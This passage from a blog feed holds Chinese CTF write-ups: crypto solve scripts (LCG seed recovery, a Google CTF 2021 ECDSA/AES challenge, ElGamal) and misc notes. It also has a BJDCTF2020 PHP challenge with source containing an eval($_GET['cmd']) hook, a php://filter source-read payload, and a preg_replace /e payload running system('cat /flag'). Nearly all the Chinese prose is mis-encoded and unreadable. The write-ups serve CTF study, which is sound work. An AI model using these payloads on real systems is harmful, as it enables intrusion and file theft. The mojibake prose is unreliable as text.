class="number">2</span> <span class="keyword">and</span> t%N <span class="keyword">or</span> MMI(n, A%n, t, s-A//n*t, N <span class="keyword">or</span> n),-<span class="number">1</span>)[n&lt;<span class="number">1</span>] <span class="comment">#é€†å…ƒè®¡ç®—</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> all_n:</span><br><span class="line">    n=<span class="built_in">abs</span>(n)</span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    a=(s[<span class="number">2</span>]-s[<span class="number">1</span>])*MMI((s[<span class="number">1</span>]-s[<span class="number">0</span>]),n)%n</span><br><span class="line">    ani=MMI(a,n)</span><br><span class="line">    b=(s[<span class="number">1</span>]-a*s[<span class="number">0</span>])%n</span><br><span class="line">    seed = (ani*(s[<span class="number">0</span>]-b))%n</span><br><span class="line">    plaintext=seed</span><br><span class="line">    print(long_to_bytes(plaintext))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Dear-Alice"><a href="#Dear-Alice" class="headerlink" title="Dear Alice"></a>Dear Alice</h3><p>google ctf 2021åŸé¢˜</p><p><a href="https://github.com/Haorical/Wargames/tree/master/google-2021/h1">https://github.com/Haorical/Wargames/tree/master/google-2021/h1</a></p><p>å«–åˆ°è„šæœ¬</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INF = (<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="number">311315114987715623444276142623839583360207853110657101019745009424926710590583360123029204556690633449715530612380512577293882572730509350735778781050933</span></span><br><span class="line"></span><br><span class="line">mod = <span class="number">8948962207650232551656602815159153422162609644098354511344597187200057010413552439917934304191956942765446530386427345937963894309923928536070534607816947</span></span><br><span class="line">a = <span class="number">6294860557973063227666421306476379324074715770622746227136910445450301914281276098027990968407983962691151853678563877834221834027439718238065725844264138</span></span><br><span class="line">b = <span class="number">3245789008328967059274849584342077916531909009637501918328323668736179176583263496463525128488282611559800773506973771797764811498834995234341530862286627</span></span><br><span class="line">n = <span class="number">8948962207650232551656602815159153422162609644098354511344597187200057010413418528378981730643524959857451398370029280583094215613882043973354392115544169</span></span><br><span class="line">G = (<span class="number">5139617820728399941653175323358137352238277428061991823713659546881441331696699723004749024403291797641521696406798421624364096550661311227399430098134141</span>,</span><br><span class="line">     <span class="number">1798860115416690485862271986832828064808333512613833729548071279524320966991708554765227095605106785724406691559310536469721469398449016850588110200884962</span>,</span><br><span class="line">     <span class="number">5042518522433577951395875294780962682755843408950010956510838422057522452845550974098236475624683438351211176927595173916071040272153903968536756498306512</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Double</span>(<span class="params">p</span>):</span></span><br><span class="line">    x, y, z = p</span><br><span class="line">    <span class="keyword">if</span> z == <span class="number">0</span> <span class="keyword">or</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> INF</span><br><span class="line">    ysqr = y * y % mod</span><br><span class="line">    zsqr = z * z % mod</span><br><span class="line">    s = <span class="number">4</span> * x * ysqr % mod</span><br><span class="line">    m = (<span class="number">3</span> * x * x + a * zsqr * zsqr) % mod</span><br><span class="line">    x2 = (m * m - <span class="number">2</span> * s) % mod</span><br><span class="line">    y2 = (m * (s - x2) - <span class="number">8</span> * ysqr * ysqr) % mod</span><br><span class="line">    z2 = <span class="number">2</span> * y * z % mod</span><br><span class="line">    <span class="keyword">return</span> x2, y2, z2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">p, q</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p[<span class="number">2</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> q</span><br><span class="line">    <span class="keyword">if</span> q[<span class="number">2</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    x1, y1, z1 = p</span><br><span class="line">    x2, y2, z2 = q</span><br><span class="line">    z1sqr = z1 * z1 % mod</span><br><span class="line">    z2sqr = z2 * z2 % mod</span><br><span class="line">    u1 = x1 * z2sqr % mod</span><br><span class="line">    u2 = x2 * z1sqr % mod</span><br><span class="line">    s1 = y1 * z2 * z2sqr % mod</span><br><span class="line">    s2 = y2 * z1 * z1sqr % mod</span><br><span class="line">    <span class="keyword">if</span> u1 == u2:</span><br><span class="line">        <span class="keyword">if</span> s1 != s2:</span><br><span class="line">            <span class="keyword">return</span> INF</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Double(p)</span><br><span class="line">    h = u2 - u1 % mod</span><br><span class="line">    hsqr = h * h % mod</span><br><span class="line">    hcube = hsqr * h % mod</span><br><span class="line">    r = s2 - s1 % mod</span><br><span class="line">    t = u1 * hsqr % mod</span><br><span class="line">    x3 = (r * r - hcube - <span class="number">2</span> * t) % mod</span><br><span class="line">    y3 = (r * (t - x3) - s1 * hcube) % mod</span><br><span class="line">    z3 = h * z1 * z2 % mod</span><br><span class="line">    <span class="keyword">return</span> x3, y3, z3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Multiply</span>(<span class="params">p, x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p == INF:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    res = INF</span><br><span class="line">    <span class="keyword">while</span> x:</span><br><span class="line">        x, r = <span class="built_in">divmod</span>(x, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> r:</span><br><span class="line">            res = Add(res, p)</span><br><span class="line">        p = Double(p)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Transform</span>(<span class="params">m, l</span>):</span></span><br><span class="line">    z = m</span><br><span class="line">    shift = l - n.bit_length()</span><br><span class="line">    <span class="keyword">if</span> shift &gt; <span class="number">0</span>:</span><br><span class="line">        z &gt;&gt;= shift</span><br><span class="line">    <span class="keyword">return</span> z</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RNG</span>(<span class="params">nbits, a, b</span>):</span></span><br><span class="line">    nbytes = nbits // <span class="number">8</span></span><br><span class="line">    B = os.urandom(nbytes)</span><br><span class="line">    <span class="keyword">return</span> a * <span class="built_in">sum</span>([B[i] * b ** i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(B))]) % <span class="number">2</span>**nbits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sign</span>(<span class="params">msg, d</span>):</span></span><br><span class="line">    h = hashlib.sha512(msg)</span><br><span class="line">    z = Transform(<span class="built_in">int</span>.from_bytes(h.digest(), <span class="string">&#x27;big&#x27;</span>), h.digest_size*<span class="number">8</span>)</span><br><span class="line">    print(<span class="string">&#x27;d = &#x27;</span>, d)</span><br><span class="line">    print(<span class="string">&#x27;z = &#x27;</span>, z)</span><br><span class="line">    k = RNG(n.bit_length(), <span class="number">16843009</span>, <span class="number">4294967296</span>)</span><br><span class="line">    print(<span class="string">&#x27;k = &#x27;</span>, k)</span><br><span class="line">    x1, y1, z1 = Multiply(G, k)</span><br><span class="line">    r = (x1 * <span class="built_in">pow</span>(z1, -<span class="number">2</span>, mod) % mod) % n</span><br><span class="line">    s = <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * d) % n</span><br><span class="line">    print(<span class="string">&#x27;r = &#x27;</span>, r)</span><br><span class="line">    print(<span class="string">&#x27;s = &#x27;</span>, s)</span><br><span class="line">    print(<span class="string">&#x27;left = &#x27;</span>, <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) % n)</span><br><span class="line">    print(<span class="string">&#x27;right = &#x27;</span>, (z + r * d) % n)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">int</span>(s) == <span class="built_in">pow</span>(k, -<span class="number">1</span>, n) * (z + r * d) % n</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Verify</span>(<span class="params">msg, Q, r, s</span>):</span></span><br><span class="line">    h = hashlib.sha512(msg)</span><br><span class="line">    z = Transform(<span class="built_in">int</span>.from_bytes(h.digest(), <span class="string">&#x27;big&#x27;</span>), h.digest_size*<span class="number">8</span>)</span><br><span class="line">    u1 = z*<span class="built_in">pow</span>(s, -<span class="number">1</span>, n) % n</span><br><span class="line">    u2 = r*<span class="built_in">pow</span>(s, -<span class="number">1</span>, n) % n</span><br><span class="line">    x1, y1, z1 = Add(Multiply(G, u1), Multiply(Q, u2))</span><br><span class="line">    <span class="keyword">return</span> r == (x1 * <span class="built_in">pow</span>(z1, -<span class="number">2</span>, mod) % mod) % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encrypt</span>(<span class="params">plaintext, x</span>):</span></span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(x).encode()).digest()</span><br><span class="line">    aes = algorithms.AES(key)</span><br><span class="line">    encryptor = Cipher(aes, modes.ECB(), default_backend()).encryptor()</span><br><span class="line">    padder = padding.PKCS7(aes.block_size).padder()</span><br><span class="line">    padded_data = padder.update(plaintext) + padder.finalize()</span><br><span class="line">    ciphertext = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>(<span class="params">ciphertext, x</span>):</span></span><br><span class="line">    key = hashlib.sha256(<span class="built_in">str</span>(x).encode()).digest()</span><br><span class="line">    aes = algorithms.AES(key)</span><br><span class="line">    decryptor = Cipher(aes, modes.ECB(), default_backend()).decryptor()</span><br><span class="line">    unpadder = padding.PKCS7(aes.block_size).unpadder()</span><br><span class="line">    decrypted_data = decryptor.update(ciphertext) + decryptor.finalize()</span><br><span class="line">    plaintext = unpadder.update(decrypted_data) + unpadder.finalize()</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line">_, _, ca = (<span class="number">8832295267397231051293216564016639537146222596144354850230682204978731311879255662259663270183445827348338041752369314181111940713714991119349376636404112</span>, <span class="number">8683784208731634307361157916911868656279723101808163939313971801256736484458199874570532609285522391139002296248059424750941962344918156540408403221858292</span>, <span class="number">105398535464409171419472607677747462033030589690350997911381059472020486557672504778060748058626707326992258591478040500759349352824508941100030623708235493999018571171774658661651532338275358740821547158517615704187173346885098836066743736788259192831313414309775979590033581301910426314601982482556670097620</span>)</span><br><span class="line"></span><br><span class="line">ka = [</span><br><span class="line">    <span class="number">0x8a6e81a10c229af504772b51c502638820811034faa62b8dafa019210347918419b71d0638c89b59026b7611edc6a14b2c1c1fb1092a352adfffb7e114f4f385</span>,</span><br><span class="line">    <span class="number">0x3f837315a1fb46097f5eb680697901d75758b859846d37cad33d3f464efb84ace1e85fc60f4e445a031b5ca0e4965e0b081bd4a6e8efea1d3ba07aad51a70cd</span></span><br><span class="line">]</span><br><span class="line">ca = ca.to_bytes(byteorder=<span class="string">&#x27;big&#x27;</span>,length=(ca.bit_length() + <span class="number">7</span>) // <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> ka:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        recv_msg = Decrypt(ca, k)</span><br><span class="line">        print(recv_msg)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="ElGamal"><a href="#ElGamal" class="headerlink" title="ElGamal"></a>ElGamal</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;./output.txt&#x27;</span>).read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">g, h, A, B, p, q = <span class="built_in">eval</span>(data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">c1, c2 = <span class="built_in">eval</span>(data[<span class="number">1</span>])</span><br><span class="line">c1_, c2_ = <span class="built_in">eval</span>(data[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">tmp = gmpy2.powmod(c2, A, p) * gmpy2.powmod(h, B, p) * gmpy2.invert(c2_, p)</span><br><span class="line">tmp = tmp % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;t=&#x27;</span>, tmp</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;A=&#x27;</span>, A</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;p=&#x27;</span>, p</span><br><span class="line">gg, x, y = gmpy2.gcdext(A - <span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span> gg</span><br><span class="line"></span><br><span class="line">m = gmpy2.powmod(tmp, x, p)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(m)[<span class="number">2</span>:].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ç­¾åˆ°-2"><a href="#ç­¾åˆ°-2" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>base32è§£ç </p><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>zstegç›´æ¥å‡º</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/QQ%E5%9B%BE%E7%89%8720211007231453.png"></p><h3 id="åŠ å¯†"><a href="#åŠ å¯†" class="headerlink" title="åŠ å¯†"></a>åŠ å¯†</h3><p>ç™¾åº¦è¯†å›¾ï¼Œç¦å°”æ‘©æ–¯ï¼Œæœç´¢å‘ç°è·³èˆçš„å°äºº</p><p>å‘ç°æç¤ºä¿¡æ¯<a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p><p>å¯†ç æ–‡ä»¶è™½ç„¶ç©ºç™½ä½†æ˜¯å ç”¨ç©ºé—´å¾ˆå¤§ï¼Œç”¨ä¸Šé¢çš„å·¥å…·</p><p>æœ€å16è¿›åˆ¶è½¬å­—ç¬¦ä¸²å¾—åˆ°flag</p><h3 id="ç¤¾å·¥"><a href="#ç¤¾å·¥" class="headerlink" title="ç¤¾å·¥"></a>ç¤¾å·¥</h3><p>æ‰«ææœºç¥¨ä¸Šçš„æ¡å½¢ç å³å¯ï¼Œå±äºpdf417ï¼Œm1åé¢å°±æ˜¯å§“å</p><p><a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com/</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;éœ‡æƒŠï¼å¹³å¹³æ— å¥‡çš„webæ‰‹ï¼Œç«Ÿç„¶æŠŠcrypto akäº†ï¼Œé¡ºå¸¦åšäº†2ä¸ªreå’Œå‡ ä¸ªmiscã€‚ã€‚ã€‚&lt;/p&gt;
&lt;p&gt;æ ¡èµ›æ„Ÿè§‰éš¾åº¦ä¸€èˆ¬ï¼Œå°±æ˜¯ç»™å…¥é—¨çš„åšäº†ï¼Œæš‘å‡å­¦çš„å¥½å¤šéƒ½ç”¨ä¸Šäº†ï¼Œæ„Ÿè§‰ä¸é”™ã€‚ä¸è¿‡æŒç»­æ—¶é—´å¤ªé•¿äº†ï¼Œç›´æ¥7å¤©ï¼Œè€Œä¸”å›½åº†é‚£å‡ å¤©è´¼å¿™ï¼Œéƒ¨é—¨ã€å·¥ä½œå®¤ã€æ–°ç”ŸÂ·Â·Â·Â·Â·Â·æ—¶é—´ä¸æ˜¯å¾ˆåˆç†ï¼Œæœ€åå‡ å¤©ç›´æ¥æ‘†çƒ‚äº†ï¼Œä¸€ä¸ªé¢˜ä¹Ÿæ²¡åšã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="ctfå­¦ä¹ " scheme="http://haorical.xyz/categories/ctf%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>20210928</title>
    <link href="http://haorical.xyz/posts/c1b9d3fa/"/>
    <id>http://haorical.xyz/posts/c1b9d3fa/</id>
    <published>2021-09-28T16:15:39.000Z</published>
    <updated>2021-09-28T17:38:22.757Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><blockquote><p>ä»£ç å®¡è®¡ æ–‡ä»¶åŒ…å«</p></blockquote><p>å…ˆåˆ©ç”¨dataæ•°æ®æµï¼Œæˆ–è€…php://inputç»•è¿‡ç¬¬ä¸€ä¸ªï¼Œå†åˆ©ç”¨php://filterè¯»å–next.phpæºç </p><p>è¿™ä¸ªæœ‰ä¸ªå‘ï¼Œè€å¿˜ï¼Œinclude phpæ–‡ä»¶æ—¶ï¼Œè¦ç”¨</p><pre><code>file=php://filter/read=convert.base64-encode/resource=next.php</code></pre><p>å°½å¿ƒbase64ç¼–ç ï¼Œå¦åˆ™ä¼ ä¸è¿‡æ¥ã€‚</p><p>ä»£ç å®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹preg_replaceç”¨æ³•</p><pre><code>preg_replace( mixed $pattern, mixed $replacement, mixed $subject[, int $limit = -1[, int &amp;$count]] ) : mixed</code></pre><p>æœç´¢subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œä»¥replacementè¿›è¡Œæ›¿æ¢ã€‚ </p><p>è¿™é‡Œåˆçœ‹äº†çœ‹phpè¯­æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> å¾ªç¯ç”¨äºéå†æ•°ç»„ã€‚</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    è¦æ‰§è¡Œä»£ç ;</span><br><span class="line">&#125;</span><br><span class="line">æ¯è¿›è¡Œä¸€æ¬¡å¾ªç¯ï¼Œå½“å‰æ•°ç»„å…ƒç´ çš„å€¼å°±ä¼šè¢«èµ‹å€¼ç»™ <span class="variable">$value</span> å˜é‡ï¼ˆæ•°ç»„æŒ‡é’ˆä¼šé€ä¸€åœ°ç§»åŠ¨ï¼‰ï¼Œåœ¨è¿›è¡Œä¸‹ä¸€æ¬¡å¾ªç¯æ—¶ï¼Œæ‚¨å°†çœ‹åˆ°æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå€¼ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    è¦æ‰§è¡Œä»£ç ;</span><br><span class="line">&#125;</span><br><span class="line">æ¯ä¸€æ¬¡å¾ªç¯ï¼Œå½“å‰æ•°ç»„å…ƒç´ çš„é”®ä¸å€¼å°±éƒ½ä¼šè¢«èµ‹å€¼ç»™ <span class="variable">$key</span> å’Œ <span class="variable">$value</span> å˜é‡ï¼ˆæ•°å­—æŒ‡é’ˆä¼šé€ä¸€åœ°ç§»åŠ¨ï¼‰ï¼Œåœ¨è¿›è¡Œä¸‹ä¸€æ¬¡å¾ªç¯æ—¶ï¼Œä½ å°†çœ‹åˆ°æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªé”®ä¸å€¼ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">&quot;Google&quot;</span>, <span class="number">2</span>=&gt;<span class="string">&quot;Runoob&quot;</span>, <span class="number">3</span>=&gt;<span class="string">&quot;Taobao&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$x</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;key  ä¸º &quot;</span> . <span class="variable">$key</span> . <span class="string">&quot;ï¼Œå¯¹åº”çš„ value ä¸º &quot;</span>. <span class="variable">$value</span> . PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">key  ä¸º <span class="number">1</span>ï¼Œå¯¹åº”çš„ value ä¸º Google</span><br><span class="line">key  ä¸º <span class="number">2</span>ï¼Œå¯¹åº”çš„ value ä¸º Runoob</span><br><span class="line">key  ä¸º <span class="number">3</span>ï¼Œå¯¹åº”çš„ value ä¸º Taobao</span><br></pre></td></tr></table></figure><p>å°±å·®ä¸å¤šäº†ï¼Œç›´æ¥æ„é€ payload</p><pre><code>?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></pre><p>è¿™é‡Œè¿˜åˆ©ç”¨äº†preg_replace /e æ¨¡å¼ä¸‹çš„ä»£ç æ‰§è¡Œé—®é¢˜ï¼Œ\S*ä¼šåŒ¹é…åˆ°getFlagè¿™ä¸ªå‡½æ•°</p><pre><code>preg_replace(&#39;/(\S*)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$&#123;getFlag()&#125;);</code></pre><p>preg_replace å‡½æ•°åœ¨åŒ¹é…åˆ°ç¬¦å·æ­£åˆ™çš„å­—ç¬¦ä¸²æ—¶ï¼Œä¼šå°†ç¬¬äºŒä¸ªå‚æ•°å½“åšä»£ç æ¥æ‰§è¡Œï¼Œå³ â€˜strtolower(â€œ\1â€)â€™ </p><p>è¿™é‡Œçš„\1å°±ç›¸å½“äºæ˜¯ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹ï¼Œç”±äº\S<em>ç”±</em>ï¼ˆï¼‰<em>åŒ…è£¹è¿™é‡Œæœ‰ä¸ª<strong>åå‘å¼•ç”¨</strong>ï¼Œ\S</em>åŒ¹é…çš„ç¬¬ä¸€ä¸ªè¡¨è¾¾å¼å°±æ˜¯${getFlag()}ï¼Œå¯¹å…¶è¿›è¡Œä»£ç 